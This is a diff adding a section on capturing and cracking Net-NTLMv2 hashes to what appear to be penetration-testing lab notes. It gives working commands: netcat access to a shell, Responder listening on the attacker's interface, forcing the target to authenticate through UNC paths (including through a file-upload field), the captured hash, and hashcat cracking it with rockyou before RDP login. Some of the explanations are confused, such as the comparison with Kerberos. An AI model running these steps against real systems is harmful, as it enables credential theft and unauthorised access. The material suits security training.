@@ -551,3 +551,93 @@ files02\administrator
 ```
 
 ### Cracking Net-NTLMv2
+
+If we have code execution or shell on a Win system as an uprivileged user, we can't use Mimikatz. Here, we can use Net-NTLMv2 network auth protoctol, which manages auth between Win servers and clients.
+
+Let's try to gain access to an SMB share on a Windows 2022  server from a Windows 11 client using Net-NTLMv2. We'll send a request to the server with the connection details to access the SMB share, and we'll receive a challenge from the server where we will encrypt data with our NTLM hash. 
+
+We will use Net-NTLMv2 instead of Kerberos which is much more secure and modern.
+
+We need to prepare our system to handle the auth process and show us the captured hash the target used to authenticate. We can use Responder for this, which has a built-in SMB server  as well as HTTP, FTP, Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).
+
+So, we have code execution on a remote system, and we'll force it to auth with us by commanding it to connect to our prepared SMB. Assuming Responder is listening on 222.222.222.222, we would just run "ls \\222.222.222.222\share" in PS. If we don't have code execution. we could use other methods. For example, if we have a file upload to a web app on a Win server, we can try to enter a non-existent file with an UNC path like \\222.222.222.222\share\nonexistent.txt, and if the web app supports SMB uploads, the Win server will auth to our SMB server.
+
+Set up responder on Kali as an SMB server and connect to a shell you have on the target system. 
+
+```console
+$ nc 192.168.204.211 4444
+
+C:\Windows\system32>whoami
+whoami
+files01\paul
+
+C:\Windows\system32>net user paul 
+net user paul
+User name                    paul
+Full Name                    paul power
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/3/2022 9:57:06 AM
+Password expires             Never
+Password changeable          6/3/2022 9:57:06 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   3/8/2024 12:11:49 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Desktop Users *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+
+Paul is not an admin, but he is a part of the Remote Desktop Users group.
+
+```console
+// get kali ip for responder to run smb on
+$ ip a
+tun0
+
+$ sudo responder -I tun0
+[+] Listening for events...    
+```
+
+Now, on the shell you have in kali for paul:
+
+```console
+dir \\192.168.45.189\test
+Access is denied.  
+```
+
+Access is denied; however, check Responder.
+
+```console
+[SMB] NTLMv2-SSP Client   : 192.168.204.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:821c4b9130f77e91:6CE3A580D7E114A51610EA18185C120A:01010000000000008089B06F6F71DA012127FE93E4A26E470000000002000800530047003300450001001E00570049004E002D00440037005A003400350037004200480056004300580004003400570049004E002D00440037005A00340035003700420048005600430058002E0053004700330045002E004C004F00430041004C000300140053004700330045002E004C004F00430041004C000500140053004700330045002E004C004F00430041004C00070008008089B06F6F71DA0106000400020000000800300030000000000000000000000000200000494308BF31FF01C979CBC8E7C98ADB5526F0817A3634D48B625E39AA799A0C430A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380039000000000000000000   
+```
+
+Save this hash and crack.
+
+```console
+$ nano paul.hash
+$ cat paul.hash
+paul::FILES01:821c4b9130f77e91:6CE3A580D7E114A51610EA18185C120A:010100000...
+
+$ hashcat --help | grep -i "ntlm"
+5600 | NetNTLMv2                                                  | Network Protocol
+
+$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+Use the cracked password to connect to the target over RDP.
+
